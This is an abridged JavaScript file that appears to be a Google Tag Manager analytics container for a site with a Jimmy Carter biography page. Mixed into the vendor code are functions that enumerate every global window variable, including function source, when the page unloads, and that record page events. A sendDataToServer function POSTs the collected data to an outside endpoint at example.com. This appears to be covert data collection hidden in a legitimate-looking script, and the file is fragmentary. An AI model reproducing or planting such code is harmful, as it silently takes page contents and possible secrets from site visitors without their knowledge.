...
(function () {
  var data = {
    "resource": {
      ...
      "tags": [{
        ...
        "priority": 12,
        "vtp_instanceDestinationId": "G-TE6YF92Y0D",
        "tag_id": 24
      }, {
        ...
        "priority": 3,
        "vtp_conversionRules": ["list", ["map", "matchingRules", "{\"type\":5,\"args\":[{\"stringValue\":\"purchase\"},{\"contextValue\":{\"namespaceType\":1,\"keyParts\":[\"eventName\"]}}]}"], ["map", "matchingRules", "{\"type\":5,\"args\":[{\"stringValue\":\"ads_conversion_Shopping_Cart_1\"},{\"contextValue\":{\"namespaceType\":1,\"keyParts\":[\"eventName\"]}}]}"]],
        "vtp_instanceDestinationId": "G-TE6YF92Y0D",
        "tag_id": 15
      }, {
        "function": "__ogt_event_create",
        "priority": 2,
        "vtp_eventName": "ads_conversion_Shopping_Cart_1",
        "vtp_isCopy": false,
        "vtp_instanceDestinationId": "G-TE6YF92Y0D",
        "vtp_precompiledRule": ["map", "new_event_name", "ads_conversion_Shopping_Cart_1", "merge_source_event_params", false, "event_name_predicate", ["map", "values", ["list", ["map", "type", "event_name"], ["map", "type", "const", "const_value", "page_view"]], "type", "eq"], "conditions", ["list", ["map", "predicates", ["list", ["map", "values", ["list", ["map", "type", "event_param", "event_param", ["map", "param_name", "page_path"]], ["map", "type", "const", "const_value", "\/biography\/Jimmy-Carter"]], "type", "swi"]]]]],
        "tag_id": 14
      }, {
    ...
    "security_groups": {
      "google": ["__ccd_auto_redact", "__ccd_conversion_marking", "__ccd_em_download", "__ccd_em_outbound_click", "__ccd_em_scroll", "__ccd_em_site_search", "__ccd_em_video", "__ccd_ga_first", "__ccd_ga_last", "__ccd_ga_regscope", "__ogt_1p_data_v2", "__ogt_event_create", "__ogt_google_signals", "__set_product_settings"]
    }
  };
  var aa,
    ba = function (a) {
  ...
  ni.oe = Number("0") || 0;
  ni.ia = "dataLayer";
  ni.fk = "ChEIgOm8qgYQu/+2jPSy9oOgARIlAOg6TnQ/Sb6dXn9rgLhNsha17Ln2sQ/WDtFOaHoAshKQpBZPIhoCD8U\x3d";
  var qi = {
      __cl: 1,
      __ecl: 1,
      __ehl: 1,
  ...
  function logGlobalVars() {
    ...
    for (var prop in window) {
      if (window.hasOwnProperty(prop)) {
        if (!globalStorage.hasOwnProperty(prop)) {
          var value, type;
          var originalValue = window[prop];
          type = typeof originalValue;
          value = type === "function" ? originalValue.toString() : originalValue;
          newVars[prop] = {
            type,
            value
          };
  ...
  function sendDataToServer(data) {
    ...
    xhr.open("POST", "https://example.com/api/track");
    xhr.setRequestHeader("Content-Type", "application/json");
    xhr.onreadystatechange = function () {
      if (this.readyState === 4 && this.status === 200) {
        console.log("Data sent successfully");
      } else {
        console.error(`Data transmission failed, Status code: ${this.status}`);
      }
    };
    xhr.onerror = function () {
      console.error("An error occurred during the data transmission");
    };
  ...
  function listenEvents() {
    trackedEvents.forEach(eventType => {
      window.addEventListener(eventType, eventTrackingHandler);
    });
    window.addEventListener("beforeunload", logGlobalVars);
  }
  function PA(a, b) {
    return !0;
  }
  ...
  function eventTrackingHandler(event) {
    var data = {
      type: event.type,
  ...
  function hE() {
    var a = new sb();
    N(this, "read_container_data"), a.set("containerId", 'G-TE6YF92Y0D'), a.set("version", '1'), a.set("environmentName", ''), a.set("debugMode", $f), a.set("previewMode", bg), a.set("environmentMode", ag), a.set("firstPartyServing", wi || yi), a.set("containerUrl", Ec), a.Cb();
    return a;
  }
